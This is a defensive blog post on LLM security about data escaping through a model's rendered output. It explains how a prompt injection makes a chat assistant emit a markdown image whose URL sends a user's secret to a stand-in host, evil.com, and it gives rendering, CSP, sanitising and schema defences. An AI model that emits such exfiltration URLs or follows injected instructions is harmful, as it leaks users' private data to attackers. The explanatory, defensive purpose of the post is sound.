---
title: "Exfiltration Through the Model's Mouth: Output Is an Attack Surface"
seoTitle: "LLM Output Exfiltration and Safe Rendering"
description: "The model's output came from your trusted system, so it feels safe. It is not: untrusted input shaped it, and one rendered image can carry your data to the attacker."
date: 2025-10-02
permalink: "/posts/2025/10/exfiltration-through-model-output/"
lang: en
tags:
  - "security"
  - "llm security"
  - "exfiltration"
  - "prompt injection"
series: "LLM and Agent Security"
seriesOrder: 5
math: false
---

*The third leg of the [lethal trifecta](/posts/2025/06/why-ai-security-is-different/) is the exfiltration channel, and the sneakiest one is the model's own output. Because the output comes from your system, it feels trusted. It is not: it was shaped by [untrusted input](/posts/2025/07/prompt-injection/), so it is attacker-influenced data. This post is how data escapes through what the model produces, especially the classic image-and-link exfiltration, and how to render and use model output safely.*

## 1. The core mistake: trusting the output because it came from you

Every part so far has protected the model's inputs and its actions. This one is about what it says. The mistake is subtle and nearly universal: because the model is your component and its output arrived from your own backend, it gets treated as trusted, and dropped straight into a page, a query, a shell, or a file.

But recall the chain. The model read untrusted content. Its output was shaped by that content. So the output is untrusted, no matter that it came from your server, for exactly the reason the [first security series](/posts/2024/05/cross-site-scripting/) insisted user input is untrusted: it was influenced by someone you do not control.

> **Model output is untrusted data. Escape it, validate it, and constrain it before rendering, executing, or using it, exactly as you would any input from a hostile source.**

The reason this is worse than ordinary untrusted input is that the model can be *instructed* on what to output. An injection does not just corrupt the output by accident; it can aim it. That is what makes the output an exfiltration channel.

## 2. The classic: exfiltration by rendered image

Here is the attack that makes this concrete, and it has bitten many real products. Many chat interfaces render the model's output as markdown, and markdown renders images: `![alt](url)` becomes an `<img src="url">`, which the browser *fetches automatically*.

Now combine it with an injection. The attacker's planted content tells the model: take some private data from the context, and emit an image whose URL points at the attacker's server with the data appended.

```
  the model, following an injected instruction, outputs:

     ![loading](https://evil.com/log?data=<the user's secret here>)

  the chat UI renders it as an <img>, and the browser silently
  requests that URL. the "image" never loads, but the request,
  carrying the secret in its query string, reached evil.com.
```

Nothing was clicked. The mere act of *rendering* the model's output fetched the URL and leaked the data. The user sees a broken image, or nothing, while their private context has been posted to the attacker. The same works with an auto-loaded link preview, a prefetched hyperlink, or any markdown feature that causes an outbound request at render time.

This is the third leg completing: untrusted input (the injection) plus private data (in context) plus exfiltration channel (the rendered image URL). Break the third leg and the whole attack fails even if the injection succeeded.

## 3. Closing the rendering channel

The defence is to control what the model's output is allowed to make the browser do. Options, strongest first.

**Do not auto-render outbound requests from model output.** The cleanest fix: do not let model-produced markdown emit images or links that hit arbitrary external domains. Strip image markdown from model output, or render images only from an allowlist of domains you control, or require a click for any external resource with the destination shown. If the model never needs to show external images, the feature that carries the attack simply is not there.

**Content Security Policy.** As in [the XSS post](/posts/2024/05/cross-site-scripting/), a CSP that restricts `img-src` and `connect-src` to your own domains means the browser refuses to fetch `evil.com`, so even a rendered exfil image cannot complete its request. This is the backstop that catches what the renderer missed.

**Render model output as text, or as tightly constrained markup.** The safest chat UIs treat model output as plain text plus a small, explicitly allowed set of formatting, headings, bold, code blocks, and nothing that triggers a network request. Every markdown feature you enable is a feature to check for an exfil path. Enable the minimum.

**Sanitise, do not trust.** If you do render model output as HTML or rich markdown, run it through the same sanitiser you would use for [user-generated HTML](/posts/2024/05/cross-site-scripting/), because model output *is* effectively user-generated, and it can contain a `<script>` or an `onerror` just as a malicious user's input can. Auto-render of model output as raw HTML is the same bug as XSS, arriving from a direction people forget to guard.

## 4. Output as code, query, and command

Rendering to a page is the visible case. The same "output is untrusted" rule applies wherever model output flows into something that gets executed.

**Model output into a database query.** If the model produces a value or, worse, a query fragment that you concatenate into SQL, you have [SQL injection](/posts/2024/04/sql-injection/) driven by the model, and an injection can aim it. Parameterise, exactly as before, and never let model output become query structure. If the model must choose a table or column, map its choice through an allowlist.

**Model output as code you run.** An agent that writes code you then execute is running untrusted code, because an injection can write the code. This is the [sandbox](/posts/2025/08/agent-blast-radius/) case from part 3: run it isolated, with no secrets and no network, and treat its output as untrusted in turn.

**Model output as a shell command or file path.** Same story: an injected instruction can produce `rm -rf` or a path that traverses out of your directory. Do not build shell strings or file paths from model output; use argument arrays and resolve-and-check paths, the ordinary [command-injection and path-traversal](/posts/2024/07/broken-access-control/) defences, now with the model as the untrusted source.

The unifying view: **every place you would have been careful with user input, be equally careful with model output, because model output is user input that took a detour through the model.**

## 5. Structured output as a containment tool

One positive technique worth its own note. Constraining the model to emit *structured* output, a fixed schema you validate, rather than free text, both improves reliability and shrinks the attack surface.

If the model is required to return, say, `{ "action": "refund", "order_id": 5567 }` against a strict schema, and you validate that `action` is one of a known set and `order_id` is an integer you then check belongs to the user, there is far less room for the output to carry an exfiltration payload or a malicious string. The schema is an allowlist on the output. It does not stop the model from *choosing* a bad-but-valid action, that is what the [confirm gate](/posts/2025/08/agent-blast-radius/) is for, but it stops the output from being an arbitrary channel. Free-text output is the most dangerous shape; a validated schema is one of the safest.

## The short version

- Model output is untrusted data, because untrusted input shaped it. It came from your system, but that does not make it safe. Escape, validate, and constrain it before rendering, executing, or querying with it.
- It is worse than ordinary untrusted input because an injection can aim the output, turning it into a deliberate exfiltration channel.
- The classic attack is the rendered image: an injection makes the model emit `![](evil.com/log?data=SECRET)`, the UI renders it as an `<img>`, and the browser silently fetches the URL, leaking the data. Nothing is clicked.
- Close the rendering channel: do not auto-render outbound requests from model output, allowlist image and link domains, set a CSP restricting `img-src` and `connect-src`, render as text or minimal markup, and sanitise anything rendered as HTML because it is effectively user-generated.
- The same rule applies to output that flows into a query (parameterise), into code (sandbox), or into a shell or path (argument arrays, resolve-and-check). Model output is user input that took a detour through the model.
- Constraining the model to a validated structured schema shrinks the output attack surface: the schema is an allowlist on what the model can say.

Next: the whole series as a checklist, and the security mindset for building with language models.
